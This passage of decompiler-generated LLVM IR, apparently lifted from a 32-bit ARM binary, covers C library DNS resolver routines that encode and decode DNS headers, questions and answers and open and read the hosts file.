  %v2_1b190 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b190 = add i32 %v2_1b190, 9
  %v4_1b190 = inttoptr i32 %v3_1b190 to i8*
  store i8 %v1_1b190, i8* %v4_1b190, align 1
  %v0_1b194 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b194 = add i32 %v0_1b194, 45
  %v2_1b194 = inttoptr i32 %v1_1b194 to i8*
  %v3_1b194 = load i8, i8* %v2_1b194, align 1
  %v2_1b198 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b198 = add i32 %v2_1b198, 10
  %v4_1b198 = inttoptr i32 %v3_1b198 to i8*
  store i8 %v3_1b194, i8* %v4_1b198, align 1
  %v0_1b19c = load i32, i32* %lr.global-to-local, align 4
  %v1_1b19c = add i32 %v0_1b19c, 44
  %v2_1b19c = inttoptr i32 %v1_1b19c to i32*
  %v3_1b19c = load i32, i32* %v2_1b19c, align 4
  %v1_1b1a0 = trunc i32 %v3_1b19c to i8
  %v2_1b1a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b1a0 = add i32 %v2_1b1a0, 11
  %v4_1b1a0 = inttoptr i32 %v3_1b1a0 to i8*
  store i8 %v1_1b1a0, i8* %v4_1b1a0, align 1
  %v2_1b1ac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1b1a8

dec_label_pc_1b1a8:                               ; preds = %entry, %bb26
  %v2_1b1ac = phi i32 [ %v3_1b0cc, %entry ], [ %v2_1b1ac.pre, %bb26 ]
  %v0_1b1a8 = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_1b1ac, i32* @r4, align 4
  ret i32 %v0_1b1a8

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 45, { 2, 1, 0 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 2, 3, 0, 1 }
  uselistorder i32 33, { 3, 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1b1a8, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1b1b0 = load i8, i8* %arg1, align 1
  %v4_1b1b0 = zext i8 %v3_1b1b0 to i32
  %v2_1b1b4 = add i32 %tmp, 1
  %v3_1b1b4 = inttoptr i32 %v2_1b1b4 to i8*
  %v4_1b1b4 = load i8, i8* %v3_1b1b4, align 1
  %v5_1b1b4 = zext i8 %v4_1b1b4 to i32
  %v4_1b1b8 = mul nuw nsw i32 %v4_1b1b0, 256
  %v5_1b1b8 = or i32 %v5_1b1b4, %v4_1b1b8
  %v2_1b1bc = inttoptr i32 %arg2 to i32*
  store i32 %v5_1b1b8, i32* %v2_1b1bc, align 4
  %v2_1b1c0 = add i32 %tmp, 2
  %v3_1b1c0 = inttoptr i32 %v2_1b1c0 to i8*
  %v4_1b1c0 = load i8, i8* %v3_1b1c0, align 1
  %tmp4 = icmp slt i8 %v4_1b1c0, 0
  %v3_1b1c4 = zext i1 %tmp4 to i32
  %v2_1b1c8 = add i32 %arg2, 4
  %v3_1b1c8 = inttoptr i32 %v2_1b1c8 to i32*
  store i32 %v3_1b1c4, i32* %v3_1b1c8, align 4
  %v4_1b1cc = load i8, i8* %v3_1b1c0, align 1
  %div = udiv i8 %v4_1b1cc, 8
  %tmp5 = urem i8 %div, 16
  %v1_1b1d4 = zext i8 %tmp5 to i32
  %v2_1b1d8 = add i32 %arg2, 8
  %v3_1b1d8 = inttoptr i32 %v2_1b1d8 to i32*
  store i32 %v1_1b1d4, i32* %v3_1b1d8, align 4
  %v4_1b1dc = load i8, i8* %v3_1b1c0, align 1
  %div1 = udiv i8 %v4_1b1dc, 4
  %tmp6 = urem i8 %div1, 2
  %v1_1b1e4 = zext i8 %tmp6 to i32
  %v2_1b1e8 = add i32 %arg2, 12
  %v3_1b1e8 = inttoptr i32 %v2_1b1e8 to i32*
  store i32 %v1_1b1e4, i32* %v3_1b1e8, align 4
  %v4_1b1ec = load i8, i8* %v3_1b1c0, align 1
  %div2 = udiv i8 %v4_1b1ec, 2
  %tmp7 = urem i8 %div2, 2
  %v1_1b1f4 = zext i8 %tmp7 to i32
  %v2_1b1f8 = add i32 %arg2, 16
  %v3_1b1f8 = inttoptr i32 %v2_1b1f8 to i32*
  store i32 %v1_1b1f4, i32* %v3_1b1f8, align 4
  %v4_1b1fc = load i8, i8* %v3_1b1c0, align 1
  %tmp8 = urem i8 %v4_1b1fc, 2
  %v1_1b200 = zext i8 %tmp8 to i32
  %v2_1b204 = add i32 %arg2, 20
  %v3_1b204 = inttoptr i32 %v2_1b204 to i32*
  store i32 %v1_1b200, i32* %v3_1b204, align 4
  %v2_1b208 = add i32 %tmp, 3
  %v3_1b208 = inttoptr i32 %v2_1b208 to i8*
  %v4_1b208 = load i8, i8* %v3_1b208, align 1
  %tmp9 = icmp slt i8 %v4_1b208, 0
  %v3_1b20c = zext i1 %tmp9 to i32
  %v2_1b210 = add i32 %arg2, 24
  %v3_1b210 = inttoptr i32 %v2_1b210 to i32*
  store i32 %v3_1b20c, i32* %v3_1b210, align 4
  %v4_1b214 = load i8, i8* %v3_1b208, align 1
  %tmp10 = urem i8 %v4_1b214, 16
  %v1_1b218 = zext i8 %tmp10 to i32
  %v2_1b21c = add i32 %arg2, 28
  %v3_1b21c = inttoptr i32 %v2_1b21c to i32*
  store i32 %v1_1b218, i32* %v3_1b21c, align 4
  %v2_1b220 = add i32 %tmp, 4
  %v3_1b220 = inttoptr i32 %v2_1b220 to i8*
  %v4_1b220 = load i8, i8* %v3_1b220, align 1
  %v5_1b220 = zext i8 %v4_1b220 to i32
  %v2_1b224 = add i32 %tmp, 5
  %v3_1b224 = inttoptr i32 %v2_1b224 to i8*
  %v4_1b224 = load i8, i8* %v3_1b224, align 1
  %v5_1b224 = zext i8 %v4_1b224 to i32
  %v4_1b228 = mul nuw nsw i32 %v5_1b220, 256
  %v5_1b228 = or i32 %v5_1b224, %v4_1b228
  %v2_1b22c = add i32 %arg2, 32
  %v3_1b22c = inttoptr i32 %v2_1b22c to i32*
  store i32 %v5_1b228, i32* %v3_1b22c, align 4
  %v2_1b230 = add i32 %tmp, 6
  %v3_1b230 = inttoptr i32 %v2_1b230 to i8*
  %v4_1b230 = load i8, i8* %v3_1b230, align 1
  %v5_1b230 = zext i8 %v4_1b230 to i32
  %v2_1b234 = add i32 %tmp, 7
  %v3_1b234 = inttoptr i32 %v2_1b234 to i8*
  %v4_1b234 = load i8, i8* %v3_1b234, align 1
  %v5_1b234 = zext i8 %v4_1b234 to i32
  %v4_1b238 = mul nuw nsw i32 %v5_1b230, 256
  %v5_1b238 = or i32 %v5_1b234, %v4_1b238
  %v2_1b23c = add i32 %arg2, 36
  %v3_1b23c = inttoptr i32 %v2_1b23c to i32*
  store i32 %v5_1b238, i32* %v3_1b23c, align 4
  %v2_1b240 = add i32 %tmp, 8
  %v3_1b240 = inttoptr i32 %v2_1b240 to i8*
  %v4_1b240 = load i8, i8* %v3_1b240, align 1
  %v5_1b240 = zext i8 %v4_1b240 to i32
  %v2_1b244 = add i32 %tmp, 9
  %v3_1b244 = inttoptr i32 %v2_1b244 to i8*
  %v4_1b244 = load i8, i8* %v3_1b244, align 1
  %v5_1b244 = zext i8 %v4_1b244 to i32
  %v4_1b248 = mul nuw nsw i32 %v5_1b240, 256
  %v5_1b248 = or i32 %v5_1b244, %v4_1b248
  %v2_1b24c = add i32 %arg2, 40
  %v3_1b24c = inttoptr i32 %v2_1b24c to i32*
  store i32 %v5_1b248, i32* %v3_1b24c, align 4
  %v2_1b250 = add i32 %tmp, 11
  %v3_1b250 = inttoptr i32 %v2_1b250 to i8*
  %v4_1b250 = load i8, i8* %v3_1b250, align 1
  %v5_1b250 = zext i8 %v4_1b250 to i32
  %v2_1b254 = add i32 %tmp, 10
  %v3_1b254 = inttoptr i32 %v2_1b254 to i8*
  %v4_1b254 = load i8, i8* %v3_1b254, align 1
  %v5_1b254 = zext i8 %v4_1b254 to i32
  %v4_1b25c = mul nuw nsw i32 %v5_1b254, 256
  %v5_1b25c = or i32 %v4_1b25c, %v5_1b250
  %v2_1b260 = add i32 %arg2, 44
  %v3_1b260 = inttoptr i32 %v2_1b260 to i32*
  store i32 %v5_1b25c, i32* %v3_1b260, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 19, 20, 6, 9, 10, 11, 21, 4, 5, 22, 23, 24, 25, 26, 0, 12, 13, 14, 7, 15, 16, 8, 3, 2, 1, 17, 18 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1b268 = load i32, i32* @r4, align 4
  store i32 %v3_1b268, i32* %stack_var_-16, align 4
  %v6_1b268 = load i32, i32* @r5, align 4
  %v9_1b268 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1b270 = load i32, i32* %arg1, align 4
  store i32 %v2_1b270, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_1b27c = inttoptr i32 %v2_1b270 to i8*
  %v2_1b27c = call i32 @__encode_dotted(i8* %v1_1b27c)
  store i32 %v2_1b27c, i32* %r0.global-to-local, align 4
  %v1_1b280 = icmp slt i32 %v2_1b27c, 0
  br i1 %v1_1b280, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_1b288 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_1b288, i32* @r4, align 4
  store i32 %v6_1b268, i32* @r5, align 4
  store i32 %v9_1b268, i32* @r6, align 4
  ret i32 %v2_1b27c

bb6:                                              ; preds = %entry
  %v1_1b284 = load i32, i32* @r4, align 4
  %v2_1b284 = sub i32 %v1_1b284, %v2_1b27c
  %v0_1b290 = load i32, i32* @r6, align 4
  %v2_1b290 = add i32 %v0_1b290, %v2_1b27c
  store i32 %v2_1b290, i32* %r2.global-to-local, align 4
  %v7_1b294 = icmp sgt i32 %v2_1b284, 3
  br i1 %v7_1b294, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_1b298 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_1b298, i32* @r4, align 4
  store i32 %v6_1b268, i32* @r5, align 4
  store i32 %v9_1b268, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_1b29c = load i32, i32* @r5, align 4
  %v1_1b29c = add i32 %v0_1b29c, 5
  %v2_1b29c = inttoptr i32 %v1_1b29c to i8*
  %v3_1b29c = load i8, i8* %v2_1b29c, align 1
  %v5_1b2a0 = inttoptr i32 %v2_1b290 to i8*
  store i8 %v3_1b29c, i8* %v5_1b2a0, align 1
  %v0_1b2a4 = load i32, i32* @r5, align 4
  %v1_1b2a4 = add i32 %v0_1b2a4, 4
  %v2_1b2a4 = inttoptr i32 %v1_1b2a4 to i32*
  %v3_1b2a4 = load i32, i32* %v2_1b2a4, align 4
  %v1_1b2a8 = trunc i32 %v3_1b2a4 to i8
  %v2_1b2a8 = load i32, i32* %r2.global-to-local, align 4
  %v3_1b2a8 = add i32 %v2_1b2a8, 1
  %v4_1b2a8 = inttoptr i32 %v3_1b2a8 to i8*
  store i8 %v1_1b2a8, i8* %v4_1b2a8, align 1
  %v0_1b2ac = load i32, i32* @r5, align 4
  %v1_1b2ac = add i32 %v0_1b2ac, 9
  %v2_1b2ac = inttoptr i32 %v1_1b2ac to i8*
  %v3_1b2ac = load i8, i8* %v2_1b2ac, align 1
  %v2_1b2b0 = load i32, i32* %r2.global-to-local, align 4
  %v3_1b2b0 = add i32 %v2_1b2b0, 2
  %v4_1b2b0 = inttoptr i32 %v3_1b2b0 to i8*
  store i8 %v3_1b2ac, i8* %v4_1b2b0, align 1
  %v0_1b2b4 = load i32, i32* @r5, align 4
  %v1_1b2b4 = add i32 %v0_1b2b4, 8
  %v2_1b2b4 = inttoptr i32 %v1_1b2b4 to i32*
  %v3_1b2b4 = load i32, i32* %v2_1b2b4, align 4
  %v0_1b2b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b2b8 = add i32 %v0_1b2b8, 4
  store i32 %v1_1b2b8, i32* %r0.global-to-local, align 4
  %v1_1b2bc = trunc i32 %v3_1b2b4 to i8
  %v2_1b2bc = load i32, i32* %r2.global-to-local, align 4
  %v3_1b2bc = add i32 %v2_1b2bc, 3
  %v4_1b2bc = inttoptr i32 %v3_1b2bc to i8*
  store i8 %v1_1b2bc, i8* %v4_1b2bc, align 1
  %v2_1b2c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b2c0, i32* @r4, align 4
  store i32 %v6_1b268, i32* @r5, align 4
  store i32 %v9_1b268, i32* @r6, align 4
  ret i32 %v1_1b2b8

; uselistorder directives
  uselistorder i32 %v2_1b27c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_1b268, { 1, 0, 2 }
  uselistorder i32 %v6_1b268, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1b2c8 = call i32 @__length_dotted()
  %v1_1b2cc = icmp slt i32 %v0_1b2c8, 0
  br i1 %v1_1b2cc, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_1b2d0 = add i32 %v0_1b2c8, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_1b2d4 = phi i32 [ %v0_1b2c8, %entry ], [ %v4_1b2d0, %bb ]
  ret i32 %v5_1b2d4

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_1b2d8 = load i32, i32* @r4, align 4
  %v6_1b2d8 = load i32, i32* @r5, align 4
  %v9_1b2d8 = load i32, i32* @r6, align 4
  %v12_1b2d8 = load i32, i32* @r7, align 4
  %v21_1b2d8 = load i32, i32* @sl, align 4
  %v2_1b2dc = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_1b2dc, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_1b2f8 = call i32 @__decode_dotted()
  store i32 %v0_1b2f8, i32* %r0.global-to-local, align 4
  store i32 %v0_1b2f8, i32* @r7, align 4
  %v1_1b2fc = icmp slt i32 %v0_1b2f8, 0
  %v0_1b300 = load i32, i32* @r4, align 4
  %v2_1b300 = add i32 %v0_1b300, %v0_1b2f8
  store i32 %v2_1b300, i32* %r8.global-to-local, align 4
  br i1 %v1_1b2fc, label %bb14, label %dec_label_pc_1b310

dec_label_pc_1b310:                               ; preds = %entry
  %v1_1b308 = load i32, i32* @r5, align 4
  %v2_1b308 = sub i32 %v1_1b308, %v2_1b300
  %v1_1b310 = add i32 %v2_1b308, -10
  store i32 %v1_1b310, i32* @r5, align 4
  %v6_1b310 = icmp slt i32 %v1_1b310, 0
  store i32 %v2_1b2dc, i32* %r0.global-to-local, align 4
  %v0_1b318 = load i32, i32* @sl, align 4
  %v2_1b318 = add i32 %v0_1b318, %v2_1b300
  store i32 %v2_1b318, i32* @r4, align 4
  br i1 %v6_1b310, label %bb, label %dec_label_pc_1b324

bb:                                               ; preds = %dec_label_pc_1b310
  br label %bb14

dec_label_pc_1b324:                               ; preds = %dec_label_pc_1b310
  %v1_1b324 = bitcast i32* %stack_var_-288 to i8*
  %v2_1b324 = call i32 @__GI_strdup(i8* %v1_1b324)
  store i32 %v2_1b324, i32* %r0.global-to-local, align 4
  %v1_1b328 = load i32, i32* @r6, align 4
  %v2_1b328 = inttoptr i32 %v1_1b328 to i32*
  store i32 %v2_1b324, i32* %v2_1b328, align 4
  %v0_1b32c = load i32, i32* @sl, align 4
  %v1_1b32c = load i32, i32* %r8.global-to-local, align 4
  %v2_1b32c = add i32 %v1_1b32c, %v0_1b32c
  %v3_1b32c = inttoptr i32 %v2_1b32c to i8*
  %v4_1b32c = load i8, i8* %v3_1b32c, align 1
  %v6_1b32c = zext i8 %v4_1b32c to i32
  %v0_1b330 = load i32, i32* @r4, align 4
  %v1_1b330 = add i32 %v0_1b330, 1
  %v2_1b330 = inttoptr i32 %v1_1b330 to i8*
  %v3_1b330 = load i8, i8* %v2_1b330, align 1
  %v4_1b330 = zext i8 %v3_1b330 to i32
  %v4_1b334 = mul nuw nsw i32 %v6_1b32c, 256
  %v5_1b334 = or i32 %v4_1b330, %v4_1b334
  store i32 %v5_1b334, i32* %r3.global-to-local, align 4
  %v1_1b338 = load i32, i32* @r6, align 4
  %v2_1b338 = add i32 %v1_1b338, 4
  %v3_1b338 = inttoptr i32 %v2_1b338 to i32*
  store i32 %v5_1b334, i32* %v3_1b338, align 4
  %v0_1b33c = load i32, i32* @r4, align 4
  %v1_1b33c = add i32 %v0_1b33c, 2
  store i32 %v1_1b33c, i32* %r1.global-to-local, align 4
  %v2_1b340 = inttoptr i32 %v1_1b33c to i8*
  %v3_1b340 = load i8, i8* %v2_1b340, align 1
  %v4_1b340 = zext i8 %v3_1b340 to i32
  %v1_1b344 = add i32 %v0_1b33c, 3
  %v2_1b344 = inttoptr i32 %v1_1b344 to i8*
  %v3_1b344 = load i8, i8* %v2_1b344, align 1
  %v4_1b344 = zext i8 %v3_1b344 to i32
  %v4_1b348 = mul nuw nsw i32 %v4_1b340, 256
  %v5_1b348 = or i32 %v4_1b344, %v4_1b348
  store i32 %v5_1b348, i32* %r3.global-to-local, align 4
  %v1_1b34c = load i32, i32* @r6, align 4
  %v2_1b34c = add i32 %v1_1b34c, 8
  %v3_1b34c = inttoptr i32 %v2_1b34c to i32*
  store i32 %v5_1b348, i32* %v3_1b34c, align 4
  %v0_1b350 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b350 = add i32 %v0_1b350, 2
  %v1_1b354 = add i32 %v0_1b350, 3
  %v2_1b354 = inttoptr i32 %v1_1b354 to i8*
  %v3_1b354 = load i8, i8* %v2_1b354, align 1
  %v4_1b354 = zext i8 %v3_1b354 to i32
  store i32 %v4_1b354, i32* %r3.global-to-local, align 4
  %v2_1b358 = inttoptr i32 %v1_1b350 to i8*
  %v3_1b358 = load i8, i8* %v2_1b358, align 1
  %v4_1b358 = zext i8 %v3_1b358 to i32
  store i32 %v4_1b358, i32* %r0.global-to-local, align 4
  %v1_1b35c = add i32 %v0_1b350, 5
  %v2_1b35c = inttoptr i32 %v1_1b35c to i8*
  %v3_1b35c = load i8, i8* %v2_1b35c, align 1
  %v4_1b35c = zext i8 %v3_1b35c to i32
  %v3_1b360 = mul nuw nsw i32 %v4_1b354, 65536
  store i32 %v3_1b360, i32* %r3.global-to-local, align 4
  %v1_1b364 = add i32 %v0_1b350, 4
  %v2_1b364 = inttoptr i32 %v1_1b364 to i8*
  %v3_1b364 = load i8, i8* %v2_1b364, align 1
  %v4_1b364 = zext i8 %v3_1b364 to i32
  %v4_1b368 = mul nuw i32 %v4_1b358, 16777216
  %v5_1b368 = or i32 %v4_1b368, %v3_1b360
  %v2_1b36c = or i32 %v5_1b368, %v4_1b35c
  %v4_1b370 = mul nuw nsw i32 %v4_1b364, 256
  %v5_1b370 = or i32 %v2_1b36c, %v4_1b370
  store i32 %v5_1b370, i32* %r3.global-to-local, align 4
  %v1_1b374 = load i32, i32* @r6, align 4
  %v2_1b374 = add i32 %v1_1b374, 12
  %v3_1b374 = inttoptr i32 %v2_1b374 to i32*
  store i32 %v5_1b370, i32* %v3_1b374, align 4
  %v0_1b378 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b378 = add i32 %v0_1b378, 6
  %v2_1b378 = inttoptr i32 %v1_1b378 to i8*
  %v3_1b378 = load i8, i8* %v2_1b378, align 1
  %v4_1b378 = zext i8 %v3_1b378 to i32
  %v0_1b37c = load i32, i32* @r4, align 4
  %v1_1b37c = add i32 %v0_1b37c, 9
  %v2_1b37c = inttoptr i32 %v1_1b37c to i8*
  %v3_1b37c = load i8, i8* %v2_1b37c, align 1
  %v4_1b37c = zext i8 %v3_1b37c to i32
  %v1_1b380 = add i32 %v0_1b37c, 10
  store i32 %v1_1b380, i32* %r0.global-to-local, align 4
  %v4_1b384 = mul nuw nsw i32 %v4_1b378, 256
  %v5_1b384 = or i32 %v4_1b37c, %v4_1b384
  store i32 %v5_1b384, i32* %r3.global-to-local, align 4
  %v0_1b388 = load i32, i32* %r8.global-to-local, align 4
  %v1_1b388 = add i32 %v0_1b388, 10
  %v0_1b38c = load i32, i32* @r5, align 4
  %v1_1b390 = add nuw nsw i32 %v5_1b384, 10
  store i32 %v1_1b390, i32* %r1.global-to-local, align 4
  %v1_1b394 = load i32, i32* @r6, align 4
  %v2_1b394 = add i32 %v1_1b394, 24
  %v3_1b394 = inttoptr i32 %v2_1b394 to i32*
  store i32 %v1_1b388, i32* %v3_1b394, align 4
  %v0_1b398 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b398 = load i32, i32* @r6, align 4
  %v2_1b398 = add i32 %v1_1b398, 20
  %v3_1b398 = inttoptr i32 %v2_1b398 to i32*
  store i32 %v0_1b398, i32* %v3_1b398, align 4
  %v0_1b39c = load i32, i32* %r3.global-to-local, align 4
  %v1_1b39c = load i32, i32* @r6, align 4
  %v2_1b39c = add i32 %v1_1b39c, 16
  %v3_1b39c = inttoptr i32 %v2_1b39c to i32*
  store i32 %v0_1b39c, i32* %v3_1b39c, align 4
  %v0_1b3a0 = load i32, i32* @r7, align 4
  %v1_1b3a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b3a0 = add i32 %v1_1b3a0, %v0_1b3a0
  %v5_1b3a4 = icmp slt i32 %v0_1b38c, %v5_1b384
  %.v2_1b3a0 = select i1 %v5_1b3a4, i32 -1, i32 %v2_1b3a0
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_1b324, %entry
  %v0_1b3a8 = phi i32 [ %.v2_1b3a0, %dec_label_pc_1b324 ], [ %v1_1b310, %bb ], [ %v0_1b2f8, %entry ]
  store i32 %v0_1b3a8, i32* %r0.global-to-local, align 4
  store i32 %v3_1b2d8, i32* @r4, align 4
  store i32 %v6_1b2d8, i32* @r5, align 4
  store i32 %v9_1b2d8, i32* @r6, align 4
  store i32 %v12_1b2d8, i32* @r7, align 4
  store i32 %v21_1b2d8, i32* @sl, align 4
  ret i32 %v0_1b3a8

; uselistorder directives
  uselistorder i32 %v0_1b3a8, { 1, 0 }
  uselistorder i32 %v5_1b384, { 1, 0, 2 }
  uselistorder i32 %v3_1b360, { 1, 0 }
  uselistorder i32 %v1_1b310, { 0, 2, 1 }
  uselistorder i32 %v0_1b2f8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 6, { 22, 23, 24, 16, 17, 25, 26, 1, 2, 28, 3, 4, 27, 0, 5, 6, 7, 8, 9, 18, 19, 10, 12, 13, 14, 15, 11, 20, 21 }
  uselistorder i32 5, { 3, 25, 26, 27, 15, 9, 6, 16, 17, 10, 18, 7, 0, 1, 8, 2, 28, 29, 11, 4, 5, 19, 20, 21, 12, 14, 13, 22, 23, 24 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_20690.1152 to i32), i32* @r1, align 4
  %v0_1b3b8 = load i32, i32* @lr, align 4
  store i32 %v0_1b3b8, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_206f4.1235 to i32), i32* @r0, align 4
  %v3_1b3c0 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_206f4.1235 to i32), i32 ptrtoint (i32* @global_var_20690.1152 to i32))
  %v2_1b3c4 = icmp eq i32 %v3_1b3c0, 0
  store i32 ptrtoint (i32* @global_var_20690.1152 to i32), i32* @r1, align 4
  br i1 %v2_1b3c4, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_1b3c0

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_20700.1237 to i32), i32* @r0, align 4
  %v2_1b3d4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_1b3d4, i32* @lr, align 4
  %v3_1b3d8 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_20700.1237 to i32), i32 ptrtoint (i32* @global_var_20690.1152 to i32))
  ret i32 %v3_1b3d8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_20690.1152 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_1b3e8 = load i32, i32* @r4, align 4
  %v6_1b3e8 = load i32, i32* @r5, align 4
  %v12_1b3e8 = load i32, i32* @r7, align 4
  %v15_1b3e8 = load i32, i32* @r8, align 4
  %v21_1b3e8 = load i32, i32* @sl, align 4
  %v24_1b3e8 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_1b3f4 = sub i32 0, %tmp61
  %v1_1b3f8 = urem i32 %v1_1b3f4, 4
  store i32 %v1_1b3f8, i32* %ip.global-to-local, align 4
  %v2_1b3f8 = icmp eq i32 %v1_1b3f8, 0
  %v0_1b3fc = load i32, i32* @r2, align 4
  %v0_1b400 = load i32, i32* @r0, align 4
  %v0_1b404 = load i32, i32* @r1, align 4
  %v0_1b408 = load i32, i32* @r3, align 4
  store i32 %v0_1b408, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_1b3f8, label %dec_label_pc_1b428, label %dec_label_pc_1b418

dec_label_pc_1b418:                               ; preds = %entry
  %v2_1b418 = sub i32 %tmp57, %v1_1b3f8
  %v3_1b418 = icmp ult i32 %tmp57, %v1_1b3f8
  br i1 %v3_1b418, label %dec_label_pc_1b6fc, label %dec_label_pc_1b420

dec_label_pc_1b420:                               ; preds = %dec_label_pc_1b418
  store i32 %v2_1b418, i32* %r2.global-to-local, align 4
  %v2_1b424 = add i32 %v1_1b3f8, %tmp61
  store i32 %v2_1b424, i32* @r4, align 4
  br label %dec_label_pc_1b428

dec_label_pc_1b428:                               ; preds = %entry, %dec_label_pc_1b420
  %v0_1b438 = phi i32 [ %tmp61, %entry ], [ %v2_1b424, %dec_label_pc_1b420 ]
  %v0_1b43c = phi i32 [ %tmp57, %entry ], [ %v2_1b418, %dec_label_pc_1b420 ]
  %tmp = icmp ult i32 %v0_1b43c, 32
  br i1 %tmp, label %dec_label_pc_1b6fc, label %dec_label_pc_1b430

dec_label_pc_1b430:                               ; preds = %dec_label_pc_1b428
  store i32 %v0_1b408, i32* %r0.global-to-local, align 4
  %v7_1b434 = icmp eq i32 %v0_1b408, 1
  %v1_1b438 = add i32 %v0_1b438, 32
  store i32 %v1_1b438, i32* @fp, align 4
  %v1_1b43c = add i32 %v0_1b43c, -32
  store i32 %v1_1b43c, i32* @r8, align 4
  br i1 %v7_1b434, label %dec_label_pc_1b568, label %dec_label_pc_1b444

dec_label_pc_1b444:                               ; preds = %dec_label_pc_1b430
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1b450 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_1b450, align 4
  %tmp80 = icmp ult i32 %v1_1b43c, 4
  br i1 %tmp80, label %dec_label_pc_1b6fc, label %dec_label_pc_1b458

dec_label_pc_1b458:                               ; preds = %dec_label_pc_1b444
  %v0_1b458 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b458 = add i32 %v0_1b458, -36
  store i32 %v1_1b458, i32* %r3.global-to-local, align 4
